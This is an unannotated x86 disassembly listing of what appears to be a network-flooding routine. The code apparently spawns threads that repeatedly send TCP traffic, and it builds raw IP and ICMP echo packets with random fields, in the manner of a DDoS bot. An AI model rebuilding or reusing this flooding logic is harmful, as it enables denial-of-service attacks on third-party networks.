131442ed:	81 c4 08 06 00 00    	add    $0x608,%esp
131442f3:	33 c0                	xor    %eax,%eax
131442f5:	e9 c0 00 00 00       	jmp    0x131443ba
131442fa:	8d 85 e8 fb ff ff    	lea    -0x418(%ebp),%eax
13144300:	68 18 f2 14 13       	push   $0x1314f218
13144305:	50                   	push   %eax
13144306:	89 3d 28 2c 15 13    	mov    %edi,0x13152c28
1314430c:	ff 15 98 39 15 13    	call   *0x13153998
13144312:	39 1d 34 2d 15 13    	cmp    %ebx,0x13152d34
13144318:	59                   	pop    %ecx
13144319:	59                   	pop    %ecx
1314431a:	75 26                	jne    0x13144342
1314431c:	ff 35 38 2d 15 13    	pushl  0x13152d38
13144322:	b9 81 01 00 00       	mov    $0x181,%ecx
13144327:	8d b5 e8 f9 ff ff    	lea    -0x618(%ebp),%esi
1314432d:	81 ec 04 06 00 00    	sub    $0x604,%esp
13144333:	8b fc                	mov    %esp,%edi
13144335:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13144337:	e8 b0 47 00 00       	call   0x13148aec
1314433c:	81 c4 08 06 00 00    	add    $0x608,%esp
13144342:	ff 35 24 2c 15 13    	pushl  0x13152c24
13144348:	89 1d 2c 2c 15 13    	mov    %ebx,0x13152c2c
1314434e:	6a 01                	push   $0x1
13144350:	e8 28 01 00 00       	call   0x1314447d
13144355:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
1314435b:	59                   	pop    %ecx
1314435c:	59                   	pop    %ecx
1314435d:	74 36                	je     0x13144395
1314435f:	53                   	push   %ebx
13144360:	53                   	push   %ebx
13144361:	ff 35 20 2c 15 13    	pushl  0x13152c20
13144367:	ff 15 3c 37 15 13    	call   *0x1315373c
1314436d:	8b f0                	mov    %eax,%esi
1314436f:	3b f3                	cmp    %ebx,%esi
13144371:	74 25                	je     0x13144398
13144373:	83 fe ff             	cmp    $0xffffffff,%esi
13144376:	74 20                	je     0x13144398
13144378:	8d 45 fc             	lea    -0x4(%ebp),%eax
1314437b:	50                   	push   %eax
1314437c:	53                   	push   %ebx
1314437d:	56                   	push   %esi
1314437e:	68 cf 39 14 13       	push   $0x131439cf
13144383:	53                   	push   %ebx
13144384:	53                   	push   %ebx
13144385:	ff 15 30 37 15 13    	call   *0x13153730
1314438b:	39 1d 28 2c 15 13    	cmp    %ebx,0x13152c28
13144391:	75 cc                	jne    0x1314435f
13144393:	eb 03                	jmp    0x13144398
13144395:	8b 75 fc             	mov    -0x4(%ebp),%esi
13144398:	56                   	push   %esi
13144399:	ff 15 e4 36 15 13    	call   *0x131536e4
1314439f:	ff 35 20 2c 15 13    	pushl  0x13152c20
131443a5:	ff 15 e4 36 15 13    	call   *0x131536e4
131443ab:	89 1d 28 2c 15 13    	mov    %ebx,0x13152c28
131443b1:	89 1d 2c 2c 15 13    	mov    %ebx,0x13152c2c
131443b7:	6a 01                	push   $0x1
131443b9:	58                   	pop    %eax
131443ba:	5f                   	pop    %edi
131443bb:	5e                   	pop    %esi
131443bc:	5b                   	pop    %ebx
131443bd:	c9                   	leave  
131443be:	c2 04 00             	ret    $0x4
131443c1:	55                   	push   %ebp
131443c2:	8b ec                	mov    %esp,%ebp
131443c4:	56                   	push   %esi
131443c5:	33 f6                	xor    %esi,%esi
131443c7:	39 35 28 2c 15 13    	cmp    %esi,0x13152c28
131443cd:	74 04                	je     0x131443d3
131443cf:	6a 02                	push   $0x2
131443d1:	eb 58                	jmp    0x1314442b
131443d3:	8b 45 08             	mov    0x8(%ebp),%eax
131443d6:	3b c6                	cmp    %esi,%eax
131443d8:	75 04                	jne    0x131443de
131443da:	33 c0                	xor    %eax,%eax
131443dc:	eb 4e                	jmp    0x1314442c
131443de:	ff 75 0c             	pushl  0xc(%ebp)
131443e1:	8b 0d 44 45 17 13    	mov    0x13174544,%ecx
131443e7:	a3 24 2c 15 13       	mov    %eax,0x13152c24
131443ec:	8b 45 10             	mov    0x10(%ebp),%eax
131443ef:	68 34 2c 15 13       	push   $0x13152c34
131443f4:	89 0d 34 2d 15 13    	mov    %ecx,0x13152d34
131443fa:	a3 38 2d 15 13       	mov    %eax,0x13152d38
131443ff:	ff 15 98 39 15 13    	call   *0x13153998
13144405:	59                   	pop    %ecx
13144406:	8d 45 08             	lea    0x8(%ebp),%eax
13144409:	59                   	pop    %ecx
1314440a:	c7 05 28 2c 15 13 01 	movl   $0x1,0x13152c28
13144411:	00 00 00 
13144414:	50                   	push   %eax
13144415:	56                   	push   %esi
13144416:	56                   	push   %esi
13144417:	68 e3 41 14 13       	push   $0x131441e3
1314441c:	56                   	push   %esi
1314441d:	56                   	push   %esi
1314441e:	ff 15 30 37 15 13    	call   *0x13153730
13144424:	a3 30 2c 15 13       	mov    %eax,0x13152c30
13144429:	6a 01                	push   $0x1
1314442b:	58                   	pop    %eax
1314442c:	5e                   	pop    %esi
1314442d:	5d                   	pop    %ebp
1314442e:	c3                   	ret    
1314442f:	56                   	push   %esi
13144430:	33 f6                	xor    %esi,%esi
13144432:	39 35 28 2c 15 13    	cmp    %esi,0x13152c28
13144438:	75 04                	jne    0x1314443e
1314443a:	6a 02                	push   $0x2
1314443c:	eb 30                	jmp    0x1314446e
1314443e:	ff 35 20 2c 15 13    	pushl  0x13152c20
13144444:	89 35 28 2c 15 13    	mov    %esi,0x13152c28
1314444a:	ff 15 e4 36 15 13    	call   *0x131536e4
13144450:	56                   	push   %esi
13144451:	ff 35 30 2c 15 13    	pushl  0x13152c30
13144457:	ff 15 d8 36 15 13    	call   *0x131536d8
1314445d:	39 74 24 08          	cmp    %esi,0x8(%esp)
13144461:	74 09                	je     0x1314446c
13144463:	56                   	push   %esi
13144464:	56                   	push   %esi
13144465:	e8 13 00 00 00       	call   0x1314447d
1314446a:	59                   	pop    %ecx
1314446b:	59                   	pop    %ecx
1314446c:	6a 01                	push   $0x1
1314446e:	58                   	pop    %eax
1314446f:	5e                   	pop    %esi
13144470:	c3                   	ret    
13144471:	a1 28 2c 15 13       	mov    0x13152c28,%eax
13144476:	c3                   	ret    
13144477:	a1 24 2c 15 13       	mov    0x13152c24,%eax
1314447c:	c3                   	ret    
1314447d:	8d 44 24 04          	lea    0x4(%esp),%eax
13144481:	6a 04                	push   $0x4
13144483:	50                   	push   %eax
13144484:	68 a4 f2 14 13       	push   $0x1314f2a4
13144489:	e8 7d 2a 00 00       	call   0x13146f0b
1314448e:	83 c4 0c             	add    $0xc,%esp
13144491:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
13144496:	74 14                	je     0x131444ac
13144498:	8d 44 24 08          	lea    0x8(%esp),%eax
1314449c:	6a 04                	push   $0x4
1314449e:	50                   	push   %eax
1314449f:	68 98 f2 14 13       	push   $0x1314f298
131444a4:	e8 62 2a 00 00       	call   0x13146f0b
131444a9:	83 c4 0c             	add    $0xc,%esp
131444ac:	6a 01                	push   $0x1
131444ae:	58                   	pop    %eax
131444af:	c3                   	ret    
131444b0:	55                   	push   %ebp
131444b1:	8b ec                	mov    %esp,%ebp
131444b3:	81 ec 18 0a 00 00    	sub    $0xa18,%esp
131444b9:	53                   	push   %ebx
131444ba:	56                   	push   %esi
131444bb:	57                   	push   %edi
131444bc:	68 c8 2e 15 13       	push   $0x13152ec8
131444c1:	8d 85 e8 f6 ff ff    	lea    -0x918(%ebp),%eax
131444c7:	68 00 d1 14 13       	push   $0x1314d100
131444cc:	50                   	push   %eax
131444cd:	ff 15 98 39 15 13    	call   *0x13153998
131444d3:	66 a1 c0 2d 15 13    	mov    0x13152dc0,%ax
131444d9:	83 c4 0c             	add    $0xc,%esp
131444dc:	66 c7 45 ec 02 00    	movw   $0x2,-0x14(%ebp)
131444e2:	50                   	push   %eax
131444e3:	ff 15 8c 37 15 13    	call   *0x1315378c
131444e9:	be 40 2d 15 13       	mov    $0x13152d40,%esi
131444ee:	66 89 45 ee          	mov    %ax,-0x12(%ebp)
131444f2:	56                   	push   %esi
131444f3:	ff 15 ac 39 15 13    	call   *0x131539ac
131444f9:	83 f8 ff             	cmp    $0xffffffff,%eax
131444fc:	56                   	push   %esi
131444fd:	75 07                	jne    0x13144506
131444ff:	e8 22 0f 00 00       	call   0x13145426
13144504:	59                   	pop    %ecx
13144505:	50                   	push   %eax
13144506:	ff 15 ac 39 15 13    	call   *0x131539ac
1314450c:	83 f8 ff             	cmp    $0xffffffff,%eax
1314450f:	89 45 f0             	mov    %eax,-0x10(%ebp)
13144512:	75 1b                	jne    0x1314452f
13144514:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
1314451a:	68 10 fc 14 13       	push   $0x1314fc10
1314451f:	50                   	push   %eax
13144520:	ff 15 98 39 15 13    	call   *0x13153998
13144526:	59                   	pop    %ecx
13144527:	33 db                	xor    %ebx,%ebx
13144529:	59                   	pop    %ecx
1314452a:	e9 08 01 00 00       	jmp    0x13144637
1314452f:	e8 90 e1 ff ff       	call   0x131426c4
13144534:	33 db                	xor    %ebx,%ebx
13144536:	39 1d c4 2e 15 13    	cmp    %ebx,0x13152ec4
1314453c:	0f 84 35 01 00 00    	je     0x13144677
13144542:	68 00 02 00 00       	push   $0x200
13144547:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
1314454d:	53                   	push   %ebx
1314454e:	50                   	push   %eax
1314454f:	e8 ce e0 ff ff       	call   0x13142622
13144554:	83 c4 0c             	add    $0xc,%esp
13144557:	6a 06                	push   $0x6
13144559:	6a 01                	push   $0x1
1314455b:	6a 02                	push   $0x2
1314455d:	ff 15 64 35 15 13    	call   *0x13153564
13144563:	8b f8                	mov    %eax,%edi
13144565:	83 ff ff             	cmp    $0xffffffff,%edi
13144568:	0f 84 ad 00 00 00    	je     0x1314461b
1314456e:	8d 45 ec             	lea    -0x14(%ebp),%eax
13144571:	6a 10                	push   $0x10
13144573:	50                   	push   %eax
13144574:	57                   	push   %edi
13144575:	ff 15 34 37 15 13    	call   *0x13153734
1314457b:	38 1d c4 2d 15 13    	cmp    %bl,0x13152dc4
13144581:	74 09                	je     0x1314458c
13144583:	c7 45 fc c4 2d 15 13 	movl   $0x13152dc4,-0x4(%ebp)
1314458a:	eb 14                	jmp    0x131445a0
1314458c:	6a 20                	push   $0x20
1314458e:	53                   	push   %ebx
1314458f:	e8 3b 14 00 00       	call   0x131459cf
13144594:	8b 04 85 18 f3 14 13 	mov    0x1314f318(,%eax,4),%eax
1314459b:	59                   	pop    %ecx
1314459c:	59                   	pop    %ecx
1314459d:	89 45 fc             	mov    %eax,-0x4(%ebp)
131445a0:	6a 20                	push   $0x20
131445a2:	53                   	push   %ebx
131445a3:	e8 27 14 00 00       	call   0x131459cf
131445a8:	59                   	pop    %ecx
131445a9:	59                   	pop    %ecx
131445aa:	ff 34 85 18 f3 14 13 	pushl  0x1314f318(,%eax,4)
131445b1:	56                   	push   %esi
131445b2:	6a 1a                	push   $0x1a
131445b4:	53                   	push   %ebx
131445b5:	e8 15 14 00 00       	call   0x131459cf
131445ba:	59                   	pop    %ecx
131445bb:	59                   	pop    %ecx
131445bc:	ff 34 85 b0 f2 14 13 	pushl  0x1314f2b0(,%eax,4)
131445c3:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
131445c9:	56                   	push   %esi
131445ca:	ff 75 fc             	pushl  -0x4(%ebp)
131445cd:	56                   	push   %esi
131445ce:	68 bc fb 14 13       	push   $0x1314fbbc
131445d3:	50                   	push   %eax
131445d4:	ff 15 98 39 15 13    	call   *0x13153998
131445da:	83 c4 20             	add    $0x20,%esp
131445dd:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
131445e3:	53                   	push   %ebx
131445e4:	50                   	push   %eax
131445e5:	e8 13 e1 ff ff       	call   0x131426fd
131445ea:	59                   	pop    %ecx
131445eb:	50                   	push   %eax
131445ec:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
131445f2:	50                   	push   %eax
131445f3:	57                   	push   %edi
131445f4:	ff 15 68 37 15 13    	call   *0x13153768
131445fa:	ff 35 a4 f3 14 13    	pushl  0x1314f3a4
13144600:	ff 15 fc 36 15 13    	call   *0x131536fc
13144606:	57                   	push   %edi
13144607:	ff 15 e4 36 15 13    	call   *0x131536e4
1314460d:	39 1d c4 2e 15 13    	cmp    %ebx,0x13152ec4
13144613:	0f 85 29 ff ff ff    	jne    0x13144542
13144619:	eb 5f                	jmp    0x1314467a
1314461b:	6a ff                	push   $0xffffffff
1314461d:	ff 15 e4 36 15 13    	call   *0x131536e4
13144623:	8d 85 e8 f7 ff ff    	lea    -0x818(%ebp),%eax
13144629:	68 94 fb 14 13       	push   $0x1314fb94
1314462e:	50                   	push   %eax
1314462f:	ff 15 98 39 15 13    	call   *0x13153998
13144635:	59                   	pop    %ecx
13144636:	59                   	pop    %ecx
13144637:	39 1d c8 2f 15 13    	cmp    %ebx,0x13152fc8
1314463d:	75 2e                	jne    0x1314466d
1314463f:	39 1d c4 2e 15 13    	cmp    %ebx,0x13152ec4
13144645:	74 26                	je     0x1314466d
13144647:	ff 35 94 30 15 13    	pushl  0x13153094
1314464d:	b9 81 01 00 00       	mov    $0x181,%ecx
13144652:	8d b5 e8 f5 ff ff    	lea    -0xa18(%ebp),%esi
13144658:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314465e:	8b fc                	mov    %esp,%edi
13144660:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13144662:	e8 85 44 00 00       	call   0x13148aec
13144667:	81 c4 08 06 00 00    	add    $0x608,%esp
1314466d:	89 1d c4 2e 15 13    	mov    %ebx,0x13152ec4
13144673:	33 c0                	xor    %eax,%eax
13144675:	eb 0d                	jmp    0x13144684
13144677:	8b 7d fc             	mov    -0x4(%ebp),%edi
1314467a:	57                   	push   %edi
1314467b:	ff 15 e4 36 15 13    	call   *0x131536e4
13144681:	6a 01                	push   $0x1
13144683:	58                   	pop    %eax
13144684:	5f                   	pop    %edi
13144685:	5e                   	pop    %esi
13144686:	5b                   	pop    %ebx
13144687:	c9                   	leave  
13144688:	c2 04 00             	ret    $0x4
1314468b:	55                   	push   %ebp
1314468c:	8b ec                	mov    %esp,%ebp
1314468e:	53                   	push   %ebx
1314468f:	33 db                	xor    %ebx,%ebx
13144691:	39 1d c4 2e 15 13    	cmp    %ebx,0x13152ec4
13144697:	74 08                	je     0x131446a1
13144699:	6a 02                	push   $0x2
1314469b:	58                   	pop    %eax
1314469c:	e9 a0 00 00 00       	jmp    0x13144741
131446a1:	a1 44 45 17 13       	mov    0x13174544,%eax
131446a6:	56                   	push   %esi
131446a7:	ff 75 08             	pushl  0x8(%ebp)
131446aa:	a3 c8 2f 15 13       	mov    %eax,0x13152fc8
131446af:	8b 45 0c             	mov    0xc(%ebp),%eax
131446b2:	be 00 d1 14 13       	mov    $0x1314d100,%esi
131446b7:	a3 c0 2d 15 13       	mov    %eax,0x13152dc0
131446bc:	8b 45 18             	mov    0x18(%ebp),%eax
131446bf:	56                   	push   %esi
131446c0:	68 40 2d 15 13       	push   $0x13152d40
131446c5:	c7 05 c4 2e 15 13 01 	movl   $0x1,0x13152ec4
131446cc:	00 00 00 
131446cf:	a3 94 30 15 13       	mov    %eax,0x13153094
131446d4:	ff 15 98 39 15 13    	call   *0x13153998
131446da:	ff 75 14             	pushl  0x14(%ebp)
131446dd:	56                   	push   %esi
131446de:	68 c8 2e 15 13       	push   $0x13152ec8
131446e3:	ff 15 98 39 15 13    	call   *0x13153998
131446e9:	83 c4 18             	add    $0x18,%esp
131446ec:	39 5d 10             	cmp    %ebx,0x10(%ebp)
131446ef:	74 14                	je     0x13144705
131446f1:	ff 75 10             	pushl  0x10(%ebp)
131446f4:	56                   	push   %esi
131446f5:	68 c4 2d 15 13       	push   $0x13152dc4
131446fa:	ff 15 98 39 15 13    	call   *0x13153998
13144700:	83 c4 0c             	add    $0xc,%esp
13144703:	eb 06                	jmp    0x1314470b
13144705:	88 1d c4 2d 15 13    	mov    %bl,0x13152dc4
1314470b:	33 f6                	xor    %esi,%esi
1314470d:	39 1d a0 f3 14 13    	cmp    %ebx,0x1314f3a0
13144713:	7e 28                	jle    0x1314473d
13144715:	57                   	push   %edi
13144716:	bf cc 2f 15 13       	mov    $0x13152fcc,%edi
1314471b:	8d 45 0c             	lea    0xc(%ebp),%eax
1314471e:	50                   	push   %eax
1314471f:	53                   	push   %ebx
13144720:	53                   	push   %ebx
13144721:	68 b0 44 14 13       	push   $0x131444b0
13144726:	53                   	push   %ebx
13144727:	53                   	push   %ebx
13144728:	ff 15 30 37 15 13    	call   *0x13153730
1314472e:	89 07                	mov    %eax,(%edi)
13144730:	46                   	inc    %esi
13144731:	83 c7 04             	add    $0x4,%edi
13144734:	3b 35 a0 f3 14 13    	cmp    0x1314f3a0,%esi
1314473a:	7c df                	jl     0x1314471b
1314473c:	5f                   	pop    %edi
1314473d:	6a 01                	push   $0x1
1314473f:	58                   	pop    %eax
13144740:	5e                   	pop    %esi
13144741:	5b                   	pop    %ebx
13144742:	5d                   	pop    %ebp
13144743:	c3                   	ret    
13144744:	83 3d c4 2e 15 13 00 	cmpl   $0x0,0x13152ec4
1314474b:	75 04                	jne    0x13144751
1314474d:	6a 02                	push   $0x2
1314474f:	58                   	pop    %eax
13144750:	c3                   	ret    
13144751:	83 25 c4 2e 15 13 00 	andl   $0x0,0x13152ec4
13144758:	6a 01                	push   $0x1
1314475a:	58                   	pop    %eax
1314475b:	c3                   	ret    
1314475c:	a1 c4 2e 15 13       	mov    0x13152ec4,%eax
13144761:	c3                   	ret    
13144762:	a1 c0 2d 15 13       	mov    0x13152dc0,%eax
13144767:	c3                   	ret    
13144768:	b8 40 2d 15 13       	mov    $0x13152d40,%eax
1314476d:	c3                   	ret    
1314476e:	55                   	push   %ebp
1314476f:	8b ec                	mov    %esp,%ebp
13144771:	53                   	push   %ebx
13144772:	56                   	push   %esi
13144773:	8b 75 08             	mov    0x8(%ebp),%esi
13144776:	57                   	push   %edi
13144777:	6a 3c                	push   $0x3c
13144779:	68 3c fc 14 13       	push   $0x1314fc3c
1314477e:	56                   	push   %esi
1314477f:	e8 cc df ff ff       	call   0x13142750
13144784:	a1 00 24 15 13       	mov    0x13152400,%eax
13144789:	83 c4 0c             	add    $0xc,%esp
1314478c:	85 c0                	test   %eax,%eax
1314478e:	8d 7e 14             	lea    0x14(%esi),%edi
13144791:	75 05                	jne    0x13144798
13144793:	e8 4d df ff ff       	call   0x131426e5
13144798:	ff 75 0c             	pushl  0xc(%ebp)
1314479b:	89 46 0c             	mov    %eax,0xc(%esi)
1314479e:	8b 45 10             	mov    0x10(%ebp),%eax
131447a1:	89 46 10             	mov    %eax,0x10(%esi)
131447a4:	ff 15 8c 37 15 13    	call   *0x1315378c
131447aa:	66 89 46 02          	mov    %ax,0x2(%esi)
131447ae:	66 a1 70 33 15 13    	mov    0x13153370,%ax
131447b4:	66 89 47 06          	mov    %ax,0x6(%edi)
131447b8:	66 ff 05 70 33 15 13 	incw   0x13153370
131447bf:	e8 21 df ff ff       	call   0x131426e5
131447c4:	8b d8                	mov    %eax,%ebx
131447c6:	c1 e3 10             	shl    $0x10,%ebx
131447c9:	e8 17 df ff ff       	call   0x131426e5
131447ce:	0b d8                	or     %eax,%ebx
131447d0:	66 83 7d 0c 1c       	cmpw   $0x1c,0xc(%ebp)
131447d5:	66 89 5f 04          	mov    %bx,0x4(%edi)
131447d9:	72 15                	jb     0x131447f0
131447db:	0f b7 5d 0c          	movzwl 0xc(%ebp),%ebx
131447df:	83 c6 1c             	add    $0x1c,%esi
131447e2:	83 eb 1b             	sub    $0x1b,%ebx
131447e5:	e8 fb de ff ff       	call   0x131426e5
131447ea:	88 06                	mov    %al,(%esi)
131447ec:	46                   	inc    %esi
131447ed:	4b                   	dec    %ebx
131447ee:	75 f5                	jne    0x131447e5
131447f0:	0f b7 75 0c          	movzwl 0xc(%ebp),%esi
131447f4:	66 83 67 02 00       	andw   $0x0,0x2(%edi)
131447f9:	8d 46 ec             	lea    -0x14(%esi),%eax
131447fc:	50                   	push   %eax
131447fd:	57                   	push   %edi
131447fe:	e8 f1 11 00 00       	call   0x131459f4
13144803:	59                   	pop    %ecx
13144804:	66 89 47 02          	mov    %ax,0x2(%edi)
13144808:	59                   	pop    %ecx
13144809:	8b c6                	mov    %esi,%eax
1314480b:	5f                   	pop    %edi
1314480c:	5e                   	pop    %esi
1314480d:	5b                   	pop    %ebx
1314480e:	5d                   	pop    %ebp
1314480f:	c3                   	ret    
13144810:	56                   	push   %esi
13144811:	8b 74 24 08          	mov    0x8(%esp),%esi
13144815:	80 66 01 00          	andb   $0x0,0x1(%esi)
13144819:	c6 06 08             	movb   $0x8,(%esi)
1314481c:	ff 15 7c 37 15 13    	call   *0x1315377c
13144822:	66 83 66 02 00       	andw   $0x0,0x2(%esi)
13144827:	66 83 66 06 00       	andw   $0x0,0x6(%esi)
1314482c:	66 89 46 04          	mov    %ax,0x4(%esi)
13144830:	8b 44 24 0c          	mov    0xc(%esp),%eax
13144834:	83 c0 f4             	add    $0xfffffff4,%eax
13144837:	50                   	push   %eax
13144838:	e8 93 de ff ff       	call   0x131426d0
1314483d:	83 c6 0c             	add    $0xc,%esi
13144840:	50                   	push   %eax
13144841:	56                   	push   %esi
13144842:	e8 db dd ff ff       	call   0x13142622
13144847:	83 c4 0c             	add    $0xc,%esp
1314484a:	5e                   	pop    %esi
1314484b:	c3                   	ret    
1314484c:	55                   	push   %ebp
1314484d:	8b ec                	mov    %esp,%ebp
1314484f:	81 ec 24 06 00 00    	sub    $0x624,%esp
13144855:	53                   	push   %ebx
13144856:	56                   	push   %esi
13144857:	57                   	push   %edi
13144858:	6a 01                	push   $0x1
1314485a:	5f                   	pop    %edi
1314485b:	68 00 10 00 00       	push   $0x1000
13144860:	89 7d f4             	mov    %edi,-0xc(%ebp)
13144863:	e8 96 0b 00 00       	call   0x131453fe
13144868:	8b f0                	mov    %eax,%esi
1314486a:	c7 04 24 9c 31 15 13 	movl   $0x1315319c,(%esp)
13144871:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
13144877:	68 00 d1 14 13       	push   $0x1314d100
1314487c:	50                   	push   %eax
1314487d:	ff 15 98 39 15 13    	call   *0x13153998
13144883:	83 c4 0c             	add    $0xc,%esp
13144886:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
1314488a:	74 07                	je     0x13144893
1314488c:	68 ff 00 00 00       	push   $0xff
13144891:	eb 01                	jmp    0x13144894
13144893:	57                   	push   %edi
13144894:	6a 03                	push   $0x3
13144896:	6a 02                	push   $0x2
13144898:	ff 15 64 35 15 13    	call   *0x13153564
1314489e:	83 cb ff             	or     $0xffffffff,%ebx
131448a1:	89 45 fc             	mov    %eax,-0x4(%ebp)
131448a4:	3b c3                	cmp    %ebx,%eax
131448a6:	75 12                	jne    0x131448ba
131448a8:	56                   	push   %esi
131448a9:	e8 64 0b 00 00       	call   0x13145412
131448ae:	c7 04 24 ec fc 14 13 	movl   $0x1314fcec,(%esp)
131448b5:	e9 b4 00 00 00       	jmp    0x1314496e
131448ba:	33 ff                	xor    %edi,%edi
131448bc:	39 7d 08             	cmp    %edi,0x8(%ebp)
131448bf:	74 75                	je     0x13144936
131448c1:	8d 45 f4             	lea    -0xc(%ebp),%eax
131448c4:	6a 04                	push   $0x4
131448c6:	50                   	push   %eax
131448c7:	6a 02                	push   $0x2
131448c9:	57                   	push   %edi
131448ca:	ff 75 fc             	pushl  -0x4(%ebp)
131448cd:	ff 15 84 36 15 13    	call   *0x13153684
131448d3:	3b c3                	cmp    %ebx,%eax
131448d5:	75 5f                	jne    0x13144936
131448d7:	56                   	push   %esi
131448d8:	e8 35 0b 00 00       	call   0x13145412
131448dd:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
131448e3:	c7 04 24 c4 fc 14 13 	movl   $0x1314fcc4,(%esp)
131448ea:	50                   	push   %eax
131448eb:	ff 15 98 39 15 13    	call   *0x13153998
131448f1:	39 3d 9c 32 15 13    	cmp    %edi,0x1315329c
131448f7:	59                   	pop    %ecx
131448f8:	59                   	pop    %ecx
131448f9:	75 30                	jne    0x1314492b
131448fb:	39 3d 98 31 15 13    	cmp    %edi,0x13153198
13144901:	74 28                	je     0x1314492b
13144903:	ff 35 68 33 15 13    	pushl  0x13153368
13144909:	b9 81 01 00 00       	mov    $0x181,%ecx
1314490e:	8d b5 dc f9 ff ff    	lea    -0x624(%ebp),%esi
13144914:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314491a:	8b fc                	mov    %esp,%edi
1314491c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314491e:	e8 c9 41 00 00       	call   0x13148aec
13144923:	81 c4 08 06 00 00    	add    $0x608,%esp
13144929:	33 ff                	xor    %edi,%edi
1314492b:	89 3d 98 31 15 13    	mov    %edi,0x13153198
13144931:	e9 73 01 00 00       	jmp    0x13144aa9
13144936:	bf 98 30 15 13       	mov    $0x13153098,%edi
1314493b:	66 c7 45 e0 02 00    	movw   $0x2,-0x20(%ebp)
13144941:	57                   	push   %edi
13144942:	ff 15 ac 39 15 13    	call   *0x131539ac
13144948:	3b c3                	cmp    %ebx,%eax
1314494a:	57                   	push   %edi
1314494b:	75 07                	jne    0x13144954
1314494d:	e8 d4 0a 00 00       	call   0x13145426
13144952:	59                   	pop    %ecx
13144953:	50                   	push   %eax
13144954:	ff 15 ac 39 15 13    	call   *0x131539ac
1314495a:	3b c3                	cmp    %ebx,%eax
1314495c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1314495f:	75 5f                	jne    0x131449c0
13144961:	56                   	push   %esi
13144962:	e8 ab 0a 00 00       	call   0x13145412
13144967:	c7 04 24 a0 fc 14 13 	movl   $0x1314fca0,(%esp)
1314496e:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
13144974:	50                   	push   %eax
13144975:	ff 15 98 39 15 13    	call   *0x13153998
1314497b:	33 db                	xor    %ebx,%ebx
1314497d:	59                   	pop    %ecx
1314497e:	39 1d 9c 32 15 13    	cmp    %ebx,0x1315329c
13144984:	59                   	pop    %ecx
13144985:	75 2e                	jne    0x131449b5
13144987:	39 1d 98 31 15 13    	cmp    %ebx,0x13153198
1314498d:	74 26                	je     0x131449b5
1314498f:	ff 35 68 33 15 13    	pushl  0x13153368
13144995:	b9 81 01 00 00       	mov    $0x181,%ecx
1314499a:	8d b5 dc f9 ff ff    	lea    -0x624(%ebp),%esi
131449a0:	81 ec 04 06 00 00    	sub    $0x604,%esp
131449a6:	8b fc                	mov    %esp,%edi
131449a8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
131449aa:	e8 3d 41 00 00       	call   0x13148aec
131449af:	81 c4 08 06 00 00    	add    $0x608,%esp
131449b5:	89 1d 98 31 15 13    	mov    %ebx,0x13153198
131449bb:	e9 e9 00 00 00       	jmp    0x13144aa9
131449c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
131449c3:	b8 a0 0f 00 00       	mov    $0xfa0,%eax
131449c8:	39 05 30 fc 14 13    	cmp    %eax,0x1314fc30
131449ce:	7e 05                	jle    0x131449d5
131449d0:	a3 30 fc 14 13       	mov    %eax,0x1314fc30
131449d5:	a1 30 fc 14 13       	mov    0x1314fc30,%eax
131449da:	83 3d 98 31 15 13 00 	cmpl   $0x0,0x13153198
131449e1:	89 45 f8             	mov    %eax,-0x8(%ebp)
131449e4:	0f 84 af 00 00 00    	je     0x13144a99
131449ea:	bb 00 f0 ff ff       	mov    $0xfffff000,%ebx
131449ef:	33 ff                	xor    %edi,%edi
131449f1:	68 00 10 00 00       	push   $0x1000
131449f6:	57                   	push   %edi
131449f7:	56                   	push   %esi
131449f8:	e8 25 dc ff ff       	call   0x13142622
131449fd:	83 c4 0c             	add    $0xc,%esp
13144a00:	39 7d 08             	cmp    %edi,0x8(%ebp)
13144a03:	75 4c                	jne    0x13144a51
13144a05:	0f b7 7d f8          	movzwl -0x8(%ebp),%edi
13144a09:	57                   	push   %edi
13144a0a:	56                   	push   %esi
13144a0b:	e8 00 fe ff ff       	call   0x13144810
13144a10:	66 83 66 02 00       	andw   $0x0,0x2(%esi)
13144a15:	59                   	pop    %ecx
13144a16:	59                   	pop    %ecx
13144a17:	ff 15 28 34 15 13    	call   *0x13153428
13144a1d:	89 46 08             	mov    %eax,0x8(%esi)
13144a20:	66 a1 70 33 15 13    	mov    0x13153370,%ax
13144a26:	57                   	push   %edi
13144a27:	66 89 46 06          	mov    %ax,0x6(%esi)
13144a2b:	66 ff 05 70 33 15 13 	incw   0x13153370
13144a32:	56                   	push   %esi
13144a33:	e8 bc 0f 00 00       	call   0x131459f4
13144a38:	59                   	pop    %ecx
13144a39:	66 89 46 02          	mov    %ax,0x2(%esi)
13144a3d:	39 1d 6c 33 15 13    	cmp    %ebx,0x1315336c
13144a43:	59                   	pop    %ecx
13144a44:	73 3a                	jae    0x13144a80
13144a46:	8d 45 e0             	lea    -0x20(%ebp),%eax
13144a49:	6a 10                	push   $0x10
13144a4b:	50                   	push   %eax
13144a4c:	6a 00                	push   $0x0
13144a4e:	57                   	push   %edi
13144a4f:	eb 1f                	jmp    0x13144a70
13144a51:	ff 75 f0             	pushl  -0x10(%ebp)
13144a54:	ff 75 f8             	pushl  -0x8(%ebp)
13144a57:	56                   	push   %esi
13144a58:	e8 11 fd ff ff       	call   0x1314476e
13144a5d:	83 c4 0c             	add    $0xc,%esp
13144a60:	39 1d 6c 33 15 13    	cmp    %ebx,0x1315336c
13144a66:	73 18                	jae    0x13144a80
13144a68:	8d 4d e0             	lea    -0x20(%ebp),%ecx
13144a6b:	6a 10                	push   $0x10
13144a6d:	51                   	push   %ecx
13144a6e:	57                   	push   %edi
13144a6f:	50                   	push   %eax
13144a70:	56                   	push   %esi
